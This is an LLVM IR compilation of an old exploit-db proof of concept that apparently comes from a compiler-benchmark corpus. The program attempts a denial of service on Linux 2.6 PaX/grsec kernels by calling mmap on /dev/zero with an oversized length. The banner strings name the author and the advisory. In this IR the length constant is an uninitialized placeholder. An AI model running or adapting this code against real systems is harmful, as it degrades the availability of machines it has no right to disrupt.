; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_24078.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_24078.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [10 x i8] c"/dev/zero\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [590 x i8] c"PaX w/ CONFIG_PAX_RANDMMAP for Linux 2.6.x DoS proof-of-concept\0Aby Shadowinteger <shadowinteger@sentinix.org> 20040504\0Acreated after a sec advisory on bugtraq posted by borg (ChrisR-) 20040503\0AChrisR -> www.cr-secure.net\0A\0Athe exploit binary must be marked PF_PAX_RANDMMAP to work!\0A\0Agreetz goes to: sabu (www.sabu.net)\0A\0A------------------------------------------------------------------------------\0Awill exec \22mmap(0, 0x%x, PROT_READ, MAP_PRIVATE, fd, 0);\22\0A\0Aif you run Linux 2.6.x-PaX or -grsec, this may \22hurt\22 your CPU(s) a little,\0Aare you sure you want to continue? [type Y to continue] \00", align 1
@DOSVAL = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [10 x i8] c"aborted.\0A\00", align 1
@.str.3 = private unnamed_addr constant [23 x i8] c"\0Aattempting to DoS...\0A\00", align 1
@PROT_READ = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [5 x i8] c"mmap\00", align 1
@.str.5 = private unnamed_addr constant [48 x i8] c"your kernel does not seem to be vulnerable! :)\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %3 = load i32, i32* @O_RDONLY, align 4
  %4 = call i32 @open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i32 %3)
  store i32 %4, i32* %2, align 4
  %5 = load i32, i32* @DOSVAL, align 4
  %6 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([590 x i8], [590 x i8]* @.str.1, i64 0, i64 0), i32 %5)
  %7 = load i32, i32* @stdout, align 4
  %8 = call i32 @fflush(i32 %7)
  %9 = call signext i8 (...) @getchar()
  %10 = sext i8 %9 to i32
  %11 = icmp ne i32 %10, 89
  br i1 %11, label %12, label %14

12:                                               ; preds = %0
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %27

14:                                               ; preds = %0
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  %16 = load i32, i32* @DOSVAL, align 4
  %17 = load i32, i32* @PROT_READ, align 4
  %18 = load i32, i32* @MAP_PRIVATE, align 4
  %19 = load i32, i32* %2, align 4
  %20 = call i64 @mmap(i32 0, i32 %16, i32 %17, i32 %18, i32 %19, i32 0)
  %21 = load i64, i64* @MAP_FAILED, align 8
  %22 = icmp eq i64 %20, %21
  br i1 %22, label %23, label %25

23:                                               ; preds = %14
  %24 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  br label %25

25:                                               ; preds = %23, %14
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %27

27:                                               ; preds = %25, %12
  %28 = load i32, i32* %1, align 4
  ret i32 %28
}

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local signext i8 @getchar(...) #1

declare dso_local i64 @mmap(i32, i32, i32, i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
